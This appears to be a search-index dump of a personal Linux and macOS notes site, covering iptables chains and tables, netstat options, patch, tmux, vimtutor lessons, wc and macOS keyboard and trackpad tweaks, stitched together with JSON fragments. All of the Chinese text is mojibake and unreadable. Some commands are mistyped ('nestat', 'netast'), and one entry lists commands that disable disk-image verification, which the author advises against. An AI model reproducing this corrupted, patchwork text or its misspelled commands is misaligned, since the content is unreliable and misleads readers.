é˜²ç«å¢™ #  ç”¨äºå®ç°Linuxä¸‹è®¿é—®æ§åˆ¶çš„åŠŸèƒ½çš„ï¼Œå®ƒåˆ†ä¸ºç¡¬ä»¶çš„æˆ–è€…è½¯ä»¶çš„é˜²ç«å¢™ä¸¤ç§ã€‚æ— è®ºæ˜¯åœ¨å“ªä¸ªç½‘ç»œä¸­ï¼Œé˜²ç«å¢™å·¥ä½œçš„åœ°æ–¹ä¸€å®šæ˜¯åœ¨ç½‘ç»œçš„è¾¹ç¼˜ã€‚\nå·¥ä½œæœºåˆ¶ #  iptables æ˜¯å·¥ä½œåœ¨ç”¨æˆ·ç©ºé—´ä¸­ï¼Œå®šä¹‰è§„åˆ™çš„å·¥å…·ï¼Œæœ¬èº«å¹¶ä¸ç®—æ˜¯é˜²ç«å¢™ã€‚\nå®ƒå®šä¹‰çš„è§„åˆ™ï¼Œå¯ä»¥è®©åœ¨å†…æ ¸ç©ºé—´å½“ä¸­çš„ netfilter æ¥è¯»å–ï¼Œå¹¶ä¸”å®ç°è®©é˜²ç«å¢™å·¥ä½œã€‚æ‰€ä»¥è¿™äº›è§„åˆ™æ”¾å…¥å†…æ ¸çš„åœ°æ–¹å¿…é¡»è¦æ˜¯ç‰¹å®šçš„ä½ç½®ï¼Œå¿…é¡»æ˜¯ tcp/ip çš„åè®®æ ˆç»è¿‡çš„åœ°æ–¹ï¼Œè¿™ä¸ª tcp/ip åè®®æ ˆå¿…é¡»ç»è¿‡ä¸”å¯ä»¥å®ç°è¯»å–è§„åˆ™çš„åœ°æ–¹å°±å«åš netfilterï¼ˆç½‘ç»œè¿‡æ»¤å™¨ï¼‰ã€‚è¿™äº›ç‰¹å®šçš„ä½ç½®åŒ…æ‹¬ï¼š\n å†…æ ¸ç©ºé—´ä¸­ï¼šä»ä¸€ä¸ªç½‘ç»œæ¥å£è¿›æ¥ï¼Œåˆ°å¦ä¸€ä¸ªç½‘ç»œæ¥å£å»çš„ä½ç½® æ•°æ®åŒ…ä»å†…æ ¸æµå…¥ç”¨æˆ·ç©ºé—´çš„ä½ç½® æ•°æ®åŒ…ä»ç”¨æˆ·ç©ºé—´æµå‡ºçš„ä½ç½® è¿›å…¥/ç¦»å¼€æœ¬æœºçš„å¤–ç½‘æ¥å£ è¿›å…¥/ç¦»å¼€æœ¬æœºçš„å†…ç½‘æ¥å£  ç”±ä¸Šæˆ‘ä»¬çŸ¥é“äº† iptables é€‰æ‹©äº† 5 ä¸ªä½ç½®æ¥ä½œä¸ºæ§åˆ¶çš„åœ°æ–¹ã€‚\nä½†æ˜¯ä½ æœ‰æ²¡æœ‰å‘ç°ï¼Œå…¶å®å‰ä¸‰ä¸ªä½ç½®å·²ç»åŸºæœ¬ä¸Šèƒ½å°†è·¯å¾„å½»åº•å°é”äº†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆå·²ç»åœ¨è¿›å‡ºçš„å£è®¾ç½®äº†å…³å¡ä¹‹åè¿˜è¦åœ¨å†…éƒ¨å¡å‘¢ï¼Ÿ ç”±äºæ•°æ®åŒ…å°šæœªè¿›è¡Œè·¯ç”±å†³ç­–ï¼Œè¿˜ä¸çŸ¥é“æ•°æ®è¦èµ°å‘å“ªé‡Œï¼Œæ‰€ä»¥åœ¨è¿›å‡ºå£æ˜¯æ²¡åŠæ³•å®ç°æ•°æ®è¿‡æ»¤çš„ã€‚æ‰€ä»¥è¦åœ¨å†…æ ¸ç©ºé—´é‡Œè®¾ç½®è½¬å‘çš„å…³å¡ï¼Œè¿›å…¥ç”¨æˆ·ç©ºé—´çš„å…³å¡ï¼Œä»ç”¨æˆ·ç©ºé—´å‡ºå»çš„å…³å¡ã€‚\né‚£ä¹ˆï¼Œæ—¢ç„¶ä»–ä»¬æ²¡ä»€ä¹ˆç”¨ï¼Œé‚£æˆ‘ä»¬ä¸ºä»€ä¹ˆè¿˜è¦æ”¾ç½®ä»–ä»¬å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬åœ¨åš NAT å’Œ DNAT çš„æ—¶å€™ï¼Œç›®æ ‡åœ°å€è½¬æ¢å¿…é¡»åœ¨è·¯ç”±ä¹‹å‰è½¬æ¢ã€‚æ‰€ä»¥æˆ‘ä»¬å¿…é¡»åœ¨å¤–ç½‘è€Œåå†…ç½‘çš„æ¥å£å¤„è¿›è¡Œè®¾ç½®å…³å¡ã€‚\nè¿™äº”ä¸ªä½ç½®æ”¾ç½®äº†äº”ä¸ªé’©å­å‡½æ•°ï¼ˆhook functionsï¼‰,ä¹Ÿå«äº”ä¸ªè§„åˆ™é“¾:\n  PREROUTING ï¼ˆè·¯ç”±å‰ï¼‰\n  INPUT ï¼ˆæ•°æ®åŒ…æµå…¥å£ï¼‰\n  FORWARD ï¼ˆè½¬å‘ç®¡å¡ï¼‰\n  OUTPUTï¼ˆæ•°æ®åŒ…æµå‡ºå£ï¼‰\n  POSTROUTINGï¼ˆè·¯ç”±åï¼‰\n  è¿™æ˜¯ netfilter è§„å®šçš„äº”ä¸ªè§„åˆ™é“¾ï¼Œä»»ä½•ä¸€ä¸ªæ•°æ®åŒ…ï¼Œåªè¦ç»è¿‡æœ¬æœºï¼Œå¿…å°†ç»è¿‡è¿™äº”ä¸ªé“¾ä¸­çš„å…¶ä¸­ä¸€ä¸ªé“¾ã€‚\nç­–ç•¥ #  é˜²ç«å¢™ç­–ç•¥ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§ï¼š\n ä¸€ç§å«â€œé€šâ€ç­–ç•¥ï¼Œè®¤é—¨æ˜¯å…³ç€çš„ï¼Œå¿…é¡»è¦å®šä¹‰è°èƒ½è¿›ã€‚ ä¸€ç§å«â€œå µâ€ç­–ç•¥ï¼Œå¤§é—¨æ˜¯æ´å¼€çš„ï¼Œä½†æ˜¯ä½ å¿…é¡»æœ‰èº«ä»½è®¤è¯ï¼Œå¦åˆ™ä¸èƒ½è¿›ã€‚  å½“æˆ‘ä»¬å®šä¹‰ç­–ç•¥æ—¶ï¼Œè¦åˆ†åˆ«å®šä¹‰å¤šæ¡åŠŸèƒ½ï¼šå®šä¹‰æ•°æ®åŒ… â†’ å…è®¸æˆ–ä¸å…è®¸ï¼›filter â†’ è¿‡æ»¤çš„åŠŸèƒ½ï¼›åœ°å€è½¬åŒ– â†’ NAT é€‰é¡¹ã€‚ä¸ºäº†è®©è¿™äº›åŠŸèƒ½äº¤æ›¿å·¥ä½œï¼Œæˆ‘ä»¬åˆ¶å®šå‡º â€œè¡¨â€ çš„æ¦‚å¿µï¼Œæ¥å®šä¹‰ã€åŒºåˆ†å„ç§ä¸åŒçš„å·¥ä½œåŠŸèƒ½å’Œå¤„ç†æ–¹å¼ã€‚\næˆ‘ä»¬ç°åœ¨ç”¨çš„æ¯”è¾ƒå¤šä¸ªåŠŸèƒ½æœ‰3ä¸ªï¼š\n  filter å®šä¹‰å…è®¸æˆ–è€…ä¸å…è®¸çš„ â†’ ä¸€èˆ¬åªèƒ½åšåœ¨3ä¸ªé“¾ä¸Šï¼šINPUT ï¼ŒFORWARD ï¼ŒOUTPUTã€‚\n  nat å®šä¹‰åœ°å€è½¬æ¢çš„ â†’ ä¸€èˆ¬ä¹Ÿåªèƒ½åšåœ¨3ä¸ªé“¾ä¸Šï¼šPREROUTING ï¼ŒOUTPUT ï¼ŒPOSTROUTINGã€‚\n  mangle åŠŸèƒ½ï¼šä¿®æ”¹æŠ¥æ–‡åŸæ•°æ® â†’ 5 ä¸ªé“¾éƒ½å¯ä»¥åšã€‚\n  PostScriptï¼šiptables/netfilter è¿™æ¬¾è½¯ä»¶æ˜¯å·¥ä½œåœ¨ç”¨æˆ·ç©ºé—´çš„ï¼Œå®ƒçš„è§„åˆ™ç«‹å³ç”Ÿæ•ˆï¼Œä¸æ˜¯ä¸€ç§æœåŠ¡ã€‚è€Œæˆ‘ä»¬ iptables ç°åœ¨è¢«åšæˆäº†ä¸€ä¸ªæœåŠ¡ï¼Œå¯ä»¥è¿›è¡Œå¯åŠ¨ï¼Œåœæ­¢çš„ã€‚å¯åŠ¨ï¼Œåˆ™å°†è§„åˆ™ç›´æ¥ç”Ÿæ•ˆï¼Œåœæ­¢ï¼Œåˆ™å°†è§„åˆ™æ’¤é”€ã€‚\næ³¨æ„ï¼šè§„åˆ™çš„æ¬¡åºéå¸¸å…³é”®ï¼Œè°çš„è§„åˆ™è¶Šä¸¥æ ¼ï¼Œåº”è¯¥æ”¾çš„è¶Šé å‰ï¼Œè€Œæ£€æŸ¥è§„åˆ™çš„æ—¶å€™ï¼Œæ˜¯æŒ‰ç…§ä»ä¸Šå¾€ä¸‹çš„æ–¹å¼è¿›è¡Œæ£€æŸ¥çš„ã€‚\nè§„åˆ™çš„å†™æ³• #  iptables å®šä¹‰è§„åˆ™çš„æ–¹å¼ï¼š\niptables -t \u0026lt;table\u0026gt; \u0026lt;COMMAND\u0026gt; [chain] \u0026lt;CRETERIA\u0026gt; -j \u0026lt;ACTION\u0026gt;  tableï¼šfilter, nat, mangle COMMAND: å®šä¹‰å¦‚ä½•å¯¹è§„åˆ™è¿›è¡Œç®¡ç† chain: å®šä¹‰æ¥ä¸‹æ¥çš„è§„åˆ™æ˜¯åœ¨å“ªä¸ªé“¾ä¸Šï¼Œå½“å®šä¹‰ç­–ç•¥æ—¶ï¼Œæ˜¯å¯ä»¥çœç•¥çš„ã€‚ CRETERIA: æŒ‡å®šåŒ¹é…çš„æ ‡å‡†ã€‚ ANCTION: æŒ‡å®šå¦‚ä½•è¿›è¡Œå¤„ç†æˆ–ç§°å¤„ç†çš„æ–¹å¼ã€‚  å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤æŸ¥çœ‹å®šä¹‰è§„åˆ™çš„è¯¦ç»†ä¿¡æ¯ï¼š\n$ iptables -L -n -v "},{"id":112,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/netstat/","title":"Netstat","section":"Linux-Command","content":" å­¦ä¹ åœ°å€ï¼š\n https://linuxtechlab.com/learn-use-netstat-with-examples/   learn netstat with example.\nnetstat #  Netstat is a command line utility that tells us about all the tcp/udp/unix socket connections on our system. It provides list of all connections that are currently established or are in waiting state. This tool is extremely useful in identifying the port numbers on which an application is working and we can also make sure if an application is working or not on the port it is supposed to work.\nExample #    Checking all connections:\n$ netstat -a   Check all tcp connections:\n$ netstat -at Check all udp connections:\n$ netstat -au Checking all unix connections:\n$ nestat -ax   List process id and name (it can be combination with any other netstat option):\n$ netast -ap   List all port number without its name (it will perform any reverse lookup \u0026amp; produce output with only numbers.), used to speed up:\n$ netstat -an port such as 22 will be resolve as ssh if n option is not specify.\n  Print only listen port:\n$ netstat -l   Print networks stats:\n$ netstat -s   Print Interfaces stats:\n$ netstat -i   Display multicast group information:\n$ netstat -g   Display network routing information:\n$ netstat -r   To get continuous information:\n$ netstat -c   "},{"id":113,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/patch/","title":"Patch","section":"Linux-Command","content":"patch #  Linux ä¸­çš„ patch å‘½ä»¤ä¸ diff å‘½ä»¤æ˜¯ä¸€å¯¹å‘½ä»¤ã€‚\nå¦‚æœæˆ‘ä»¬å°† diff å‘½ä»¤çš„è¾“å‡ºå¯¼å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥ç§°ä½œä¸€ä¸ª â€œè¡¥ä¸â€ï¼Œåˆ©ç”¨ patch å‘½ä»¤å°±å¯ä»¥å°†å˜åŒ– apply åˆ°æ¯ä¸€ä¸ªå…·ä½“çš„æ–‡ä»¶ä¸­ã€‚\n"},{"id":114,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/tmux/","title":"Tmux","section":"Linux-Command","content":"  https://www.hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/   "},{"id":115,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/vim/","title":"Vim","section":"Linux-Command","content":" å­¦ä¹ åœ°å€ï¼švimtutor\nvimtutor æ˜¯ä¸€ä¸ªç”± vim å®˜æ–¹æä¾›çš„æ•™ç¨‹ï¼Œåœ¨ bash ç•Œé¢ç›´æ¥è¿è¡Œ vimtutor å³å¯æŸ¥çœ‹ã€‚\n vimtutor #  Lesson 1 #    ç§»åŠ¨å…‰æ ‡ï¼š\n ^\rk\r\u0026lt; h l \u0026gt;\rj\rv HINTï¼š\n h çš„é”®ä½äºå·¦è¾¹ï¼Œæ¯æ¬¡æŒ‰ä¸‹å°±ä¼šå‘å·¦ç§»åŠ¨ã€‚ l çš„é”®ä½äºå³è¾¹ï¼Œæ¯æ¬¡æŒ‰ä¸‹å°±ä¼šå‘å³ç§»åŠ¨ã€‚ j é”®çœ‹èµ·æ¥å¾ˆè±¡ä¸€æ”¯å°–ç«¯æ–¹å‘æœä¸‹çš„ç®­å¤´ã€‚    vim çš„é€€å‡ºï¼š\n è¾“å…¥ :q!\u0026lt;Enter\u0026gt; ä¼šé€€å‡ºç¼–è¾‘å™¨å¹¶ä¸”ä¸¢å¼ƒè¿›å…¥ç¼–è¾‘å™¨ä¹‹åçš„æ‰€æœ‰æ”¹åŠ¨ã€‚ æŒ‰ä¸‹ :wq\u0026lt;Enter\u0026gt;ä¿å­˜å¹¶é€€å‡º vim    åˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®çš„å­—ç¬¦ï¼šå¯ä»¥æŒ‰ä¸‹ x é”®æ¥åˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®çš„å­—ç¬¦ã€‚\n  æ’å…¥æ–‡æœ¬ï¼šå¯ä»¥æŒ‰ä¸‹ i é”®æ¥æ’å…¥å­—ç¬¦ã€‚\n  æ·»åŠ æ–‡æœ¬ï¼šå¯ä»¥æŒ‰ä¸‹ A é”®æ¥æ·»åŠ æ–‡æœ¬ï¼ˆå…‰æ ‡ä¼šå®šä½åˆ°è¡Œæœ«ï¼‰\n  Lesson 2 #    åˆ é™¤ç±»å‘½ä»¤ï¼š\n åˆ é™¤å•è¯ï¼šæŒ‰ä¸‹ dw å¯ä»¥ä»å…‰æ ‡å¤„åˆ é™¤åˆ°ä¸€ä¸ªå•è¯çš„æœ«å°¾ åˆ é™¤åˆ°è¡Œæœ«ï¼šè¾“å…¥ d$ ä»å½“å‰å…‰æ ‡åˆ é™¤åˆ°è¡Œæœ«ã€‚    å‘½ä»¤å’Œå¯¹è±¡ï¼šè®¸å¤šæ”¹å˜æ–‡æœ¬çš„å‘½ä»¤éƒ½ç”±ä¸€ä¸ªæ“ä½œç¬¦å’Œä¸€ä¸ªåŠ¨ä½œæ„æˆã€‚\næ¯”å¦‚ï¼š\n ä»¥ä¸Šçš„åˆ é™¤æ“ä½œç¬¦ d çš„å‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼šd motionã€‚  å…¶ä¸­ï¼š\n d ï¼šåˆ é™¤æ“ä½œç¬¦ã€‚ motionï¼šåˆ é™¤ç¬¦çš„æ“ä½œå¯¹è±¡  motion çš„ç®€çŸ­åŠ¨ä½œåˆ—è¡¨ï¼š\n w - ä»å½“å‰å…‰æ ‡å½“å‰ä½ç½®ç›´åˆ°ä¸‹ä¸€ä¸ªå•è¯èµ·å§‹å¤„ï¼Œä¸åŒ…æ‹¬å®ƒçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚ e - ä»å½“å‰å…‰æ ‡å½“å‰ä½ç½®ç›´åˆ°å•è¯æœ«å°¾ï¼ŒåŒ…æ‹¬æœ€åä¸€ä¸ªå­—ç¬¦ã€‚ï¼ˆä¸ w åŒºåˆ«ä¸ºä¸ä¼šåˆ é™¤ç©ºæ ¼ï¼‰ $ - ä»å½“å‰å…‰æ ‡å½“å‰ä½ç½®ç›´åˆ°å½“å‰è¡Œæœ«ã€‚    ä½¿ç”¨è®¡æ•°æŒ‡å®šåŠ¨ä½œï¼šåœ¨åŠ¨ä½œå‰è¾“å…¥æ•°å­— nï¼Œä¼šä½¿è¯¥åŠ¨ä½œé‡å¤ n æ¬¡ã€‚\nç¤ºä¾‹ï¼š\n è¾“å…¥ 2w ä½¿å…‰æ ‡å‘å‰ç§»åŠ¨ä¸¤ä¸ªå•è¯ã€‚ è¾“å…¥ 3e ä½¿å…‰æ ‡å‘å‰ç§»åŠ¨åˆ°ç¬¬ä¸‰ä¸ªå•è¯çš„æœ«å°¾ã€‚ è¾“å…¥ 0 ä½¿å¾—å…‰æ ‡ç§»åŠ¨åˆ°è¡Œé¦–ã€‚    ä½¿ç”¨æ“ä½œç¬¦æ—¶ï¼Œåœ¨å¯¹è±¡å‰è¾“å…¥æ•°å­— n å¯ä»¥é‡å¤ n æ¬¡ã€‚\næ ¼å¼ï¼šoperator [number] motion\næ¯”å¦‚ï¼šd2w å¯ä»¥åˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®çš„ä¸‹ä¸¤ä¸ªå•è¯åˆ é™¤ã€‚\n  åˆ é™¤æ•´è¡Œï¼šè¿ç»­è¾“å…¥ä¸¤æ¬¡ d ï¼Œå³ dd å¯ä»¥åˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®çš„æ•´è¡Œã€‚\n  æ’¤é”€ç±»å‘½ä»¤ï¼š\n æ’¤é”€æœ€åæ‰§è¡Œçš„å‘½ä»¤ï¼šè¾“å…¥ u æ¥æ’¤é”€æœ€åæ‰§è¡Œçš„å‘½ä»¤ã€‚ æ’¤é”€å¯¹æ•´è¡Œçš„ä¿®æ”¹ï¼šè¾“å…¥ U æ¥æ’¤é”€å¯¹æ•´è¡Œçš„ä¿®æ”¹ã€‚ é‡åšæ’¤é”€çš„å‘½ä»¤ï¼š CTRL+R    Lesson 3 #    Put command: Type p to put previously deleted text after the cursor.\n  Replace command: Type rx to replace the character at the cursor with x.\n  The change operator: To change until the end of a word, type ce.\nThis operator format: c [motion] number , where the motions are the same.\n  Lesson 4 #    Cursor location and file status:\n  Type CTRL-G to show your location in the file and the file status.\nNOTICE: You may see the cursor position in the lower right corner of the screen. This happens when the \u0026lsquo;ruler\u0026rsquo; option is set (see :help \u0026lsquo;ruler\u0026rsquo; )\n  Type G to move to a bottom of the file.\n  Type gg to move you to the start of the file.\n  Type the number of a line, and then G. This will goto a specific line.\n    The search command:\n Type / followed by a phrase to search for the phrase. To search for a phrase in the backward direction, use ? instead of / . To search for the same phrase again, simply type n. findTo search for the same phrase in the opposite direction, type N. To go back to where you came from press CTRL-O, CTRL-I goes forward.    Matching parentheses search: Type % to find a matching ), ], or }.\n  The substitute command:\n Type :s/old/new to substitute \u0026rsquo;new\u0026rsquo; for the first \u0026lsquo;old\u0026rsquo; in a line Type :s/old/new/g to substitute new for all \u0026lsquo;old\u0026rsquo;s on a line type Type :#,#s/old/new/g where #,# are the line numbers of the range of lines where the substitution is to be done. Type :%s/old/new/g to change every occurrence in the whole file. Type :%s/old/new/gc to find every occurrence in the whole file, with a prompt whether to substitute or not.    Lesson 5 #    Execute an external command: Type :! followed by an external command to execute that command.\n NOTICE: All : commands must be finished by hitting \u0026lt;ENTER\u0026gt;.    More on writing files: To save the changes made to the text, type :w FILENAME .\n  Selecting text to write: To save part of the file, type v motion :w FILENAME\n  Retrieving and merging files: To insert the contents of a file, type :r FILENAME\n  PostScript: You can also read the output of an external command.\nFor example, :r !ls reads the output of the ls command and puts it below the cursor.\n    Lesson 6 #    The open command:\n Type o to open a line below the cursor and place you in Insert mode. To open up a line ABOVE the cursor, simply type a capital O    The append command: Type a to insert text AFTER the cursor.\n NOTICE: a, i and A all go to the same Insert mode, the only difference is where the characters are inserted.    Another way to replace: Type a capital R to replace more than one character.\n  Copy and paste text:\n Use y operator to copy text. Use p operator to paste it. PS: Move the cursor to the end of next line j$    Set option: Set an option so a search or substitute ignores case\n  set the ic (ignore case) option by entering: :set ic\n  set the \u0026lsquo;hlsearch\u0026rsquo; (highlight search) and \u0026lsquo;incsearch\u0026rsquo; (show partial matches) options: :set hls is\n  to disable ignoring case by enter: :set noic\n  to remove the highlighting of matches enter: :nohlsearch\n  If you want to ignore case for just one search command, use \\c in the phrase: /ignore\\c \u0026lt;ENTER\u0026gt;\n    Lesson 7 #    Getting help: type one of these three command:\n press the \u0026lt;HELP\u0026gt; key (if you have one) press the \u0026lt;F1\u0026gt; key (if you have one) type :help \u0026lt;ENTER\u0026gt;  You can find help on just about any subject, by giving an argument to the :help command\n :help w :help c_CTRL-D :help insert-index :help user-manual    Create a startup script: editing the following file in Unix :e ~/.vimrc\n for more information, type :help vimrc-intro    Completion: command line completion with CTRL-D and \u0026lt;TAB\u0026gt;\n NOTICE: make sure vim is not in compatible mode: :set nocp    "},{"id":116,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/wc/","title":"Wc","section":"Linux-Command","content":" å­¦ä¹ åœ°å€ï¼š\n https://www.tecmint.com/wc-command-examples/   wc #  The wc(word count) command in Unix/Linux operating systems is used to find out number of newline count, word count, byte and characters count in a files specified by the file arguments.\nThe syntax of wc command as shown below:\n$ wc [options] filenames The following are the options and usage provided by the command:\nwc -l : Prints the number of lines in a file. wc -w : prints the number of words in a file. wc -c : Displays the count of bytes in a file. wc -m : prints the count of characters from a file. wc -L : prints only the length of the longest line in a file. "},{"id":117,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/macos/1.%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/","title":"1.ç³»ç»Ÿé…ç½®","section":"MacOS","content":"ç³»ç»Ÿé…ç½® #  ç³»ç»Ÿé…ç½®ä¼˜åŒ– #    å¤§å°å†™ã€Ctrl é”®äº¤æ¢ï¼ˆæˆ‘æœ€åè¿˜æ˜¯æ¢å›æ¥äº†ï¼‰ï¼š\næ·»åŠ è„šæœ¬æ–‡ä»¶ ~/.macbootstrap/onlogin.shï¼š\nhidutil property --set \u0026#39;{\u0026#34;UserKeyMapping\u0026#34;:[{\u0026#34;HIDKeyboardModifierMappingSrc\u0026#34;:0x700000039,\u0026#34;HIDKeyboardModifierMappingDst\u0026#34;:0x7000000E0},{\u0026#34;HIDKeyboardModifierMappingSrc\u0026#34;:0x7000000E0,\u0026#34;HIDKeyboardModifierMappingDst\u0026#34;:0x700000039}]}\u0026#39; æ·»åŠ å¼€å¯å¯åŠ¨æ–‡ä»¶ ~/Library/LaunchAgents/com.bestsifter.onlogin.plisteï¼š\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt;  \u0026lt;key\u0026gt;LaunchOnlyOnce\u0026lt;/key\u0026gt;  \u0026lt;true/\u0026gt;  \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt;  \u0026lt;string\u0026gt;com.bestswifter.onlogin\u0026lt;/string\u0026gt;  \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt;  \u0026lt;array\u0026gt;  \u0026lt;string\u0026gt;zsh\u0026lt;/string\u0026gt;  \u0026lt;string\u0026gt;-c\u0026lt;/string\u0026gt;  \u0026lt;string\u0026gt;\u0026#34;$HOME/.macbootstrap/onlogin.sh\u0026#34;\u0026lt;/string\u0026gt;  \u0026lt;/array\u0026gt;  \u0026lt;key\u0026gt;KeepAlive\u0026lt;/key\u0026gt;  \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; ç„¶ååœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š\nsudo launchctl load ~/Library/LaunchAgents/com.bestswifter.onlogin.plist   è§¦æ‘¸æ¿ä¼˜åŒ–ã€‚åªéœ€è¦è½»è§¦è§¦æ‘¸æ¿è€Œä¸éœ€è¦ç‚¹å‡»ï¼ˆå¼€å¯ä¹‹åå¥½åƒæ²¡æœ‰ç«‹å³ç”Ÿæ•ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰ï¼š\ndefaults write com.apple.AppleMultitouchTrackpad Clicking -int 1 defaults -currentHost write NSGlobalDomain com.apple.mouse.tapBehavior -int 1 defaults write NSGlobalDomain com.apple.mouse.tapBehavior -int 1 ä¸‰æŒ‡æ‹–æ‹½ï¼ˆå¥½åƒå‘½ä»¤ä¸æ€ä¹ˆç®¡ç”¨ï¼Œä¸ç®¡ç”¨çš„è¯éœ€è¦åœ¨è¾…åŠ©åŠŸèƒ½é‡Œé¢æ‰‹åŠ¨è®¾ç½®ï¼‰ï¼š\ndefaults write com.apple.driver.AppleBluetoothMultitouch.trackpad TrackpadThreeFingerDrag -bool true defaults write com.apple.AppleMultitouchTrackpad TrackpadThreeFingerDrag -bool true   ç”¨å¥½ F1-F12ï¼ˆæˆ‘çš„ç”µè„‘ä¸Šé¢å¥½åƒæ²¡æœ‰è¿™ä¸€æ’æŒ‰é”®ï¼Ÿï¼‰\n  å…³é—­é•œåƒéªŒè¯ï¼ˆæˆ‘è¿˜æ˜¯ä¸å»ºè®®å…³é—­ï¼Œå®‰å…¨æ€§è¿˜æ˜¯è¦æœ‰çš„ï¼Œåšå¼€å‘çš„å°±æ˜¯ä¸é‡è§†å®‰å…¨ï¼‰ï¼š\ndefaults write com.apple.frameworks.diskimages skip-verify -bool true defaults write com.apple.frameworks.diskimages skip-verify-locked -bool true defaults write com.apple.frameworks.diskimages skip-verify-remote -bool true   å®Œå…¨é”®ç›˜æ§åˆ¶ï¼ˆå¯ä»¥ä½¿ç”¨ tab é”®åœ¨å„ä¸ªé€‰é¡¹ä¸­è¿›è¡Œåˆ‡æ¢ï¼Œç©ºæ ¼é”®é€‰æ‹©å½“å‰é€‰é¡¹ï¼‰ï¼š\ndefaults write NSGlobalDomain AppleKeyboardUIMode -int 3   ç³»ç»Ÿå¿«æ·é”® #    å…³äº CTRLï¼šå…‰æ ‡ç§»åŠ¨ï¼šå¸¸è§çš„å‡ ä¸ªè¡Œçº§åˆ«æ“ä½œæœ‰ï¼š\n Ctrl + Aï¼šç§»åŠ¨åˆ°è¡Œé¦–ï¼› Ctrl + Eï¼šç§»åŠ¨åˆ°è¡Œå°¾ï¼› Ctrl + Kï¼šåˆ é™¤åˆ°è¡Œå°¾ï¼› Ctrl + Nï¼šç§»åŠ¨åˆ°ä¸‹ä¸€è¡Œï¼ˆnext lineï¼‰ï¼› Ctrl + Pï¼šç§»åŠ¨åˆ°ä¸Šä¸€è¡Œï¼ˆprevious lineï¼‰ã€‚  å‡ ä¸ªæ¯”è¾ƒå¸¸è§çš„å­—æ¯çº§åˆ«æ“ä½œæœ‰ï¼š\n Ctrl + Fï¼šå‘å³ï¼ˆForwardï¼‰ç§»åŠ¨ä¸€ä¸ªå­—æ¯ï¼› Ctrl + Bï¼šå‘å·¦ï¼ˆBackwardï¼‰ç§»åŠ¨ä¸€ä¸ªå­—æ¯ï¼› Ctrl + Dï¼šå‘å³åˆ é™¤ä¸€ä¸ªå­—æ¯ï¼Œç­‰ä»·äº â†’ + Deleteè¿™ä¸ªå¿«æ·é”®ä¹Ÿå¾ˆå¸¸ç”¨ï¼› Ctrl + Hï¼šå‘å·¦åˆ é™¤ä¸€ä¸ªå­—æ¯ï¼Œç­‰ä»·äº Deleteï¼›    å…³äº OPTIONï¼šå¦‚æœè§‰å¾—æŒ‰å­—æ¯æ“ä½œå¤ªè¿‡äºç»†ç²’åº¦ï¼ŒæŒ‰è¡Œæ“ä½œåˆå¤ªç²—ç²’åº¦ï¼š\n Option + â†ï¼šå…‰æ ‡å‘å·¦ç§»åŠ¨ä¸€ä¸ªå•è¯ï¼› Option + â†’ï¼šå…‰æ ‡å‘å³ç§»åŠ¨ä¸€ä¸ªå•è¯ï¼› Option + Deleteï¼šåˆ é™¤ä¸€ä¸ªå•è¯ï¼›    å…³äº SHIFTï¼šåœ¨æŸä¸ªä½ç½®ç‚¹å‡»å…‰æ ‡å¹¶æŒ‰ä½ shift é”®ä¸æ¾å¼€ï¼Œå†å»å¦ä¸€ä¸ªä½ç½®ç‚¹å‡»ä¸€æ¬¡ï¼Œå°±å¯ä»¥é€‰ä¸­ä¸¤æ¬¡ç‚¹å‡»ä½ç½®ä¹‹é—´çš„æ–‡æœ¬å†…å®¹ã€‚\n  æ‹“å±•é¢„è§ˆç¨‹åº #  å¯¹äºä¸€äº›æ–‡æœ¬æ–‡ä»¶ï¼ŒæŒ‰ä¸‹ç©ºæ ¼é”®å°±å¯ä»¥è°ƒç”¨ç³»ç»Ÿçš„é¢„è§ˆç¨‹åºè¿›è¡Œé¢„è§ˆï¼Œå¿«é€Ÿæµè§ˆæ–‡ä»¶å†…å®¹ã€‚\nå¯ä»¥è¾“å…¥ä¸‹é¢çš„å‘½ä»¤æ¥æ‹“å±•å®‰è£…ï¼Œä»¥ä¾¿æ”¯æŒæ›´å¤šçš„æ–‡ä»¶æ ¼å¼ï¼š\n$ brew cask install qlcolorcode qlstephen qlmarkdown quicklook-json qlimagesize webpquicklook qlvideo provisionql quicklookapk  qlolorodeï¼šä¸€ä¸ªä»£ç é«˜äº®çš„æ’ä»¶ï¼› 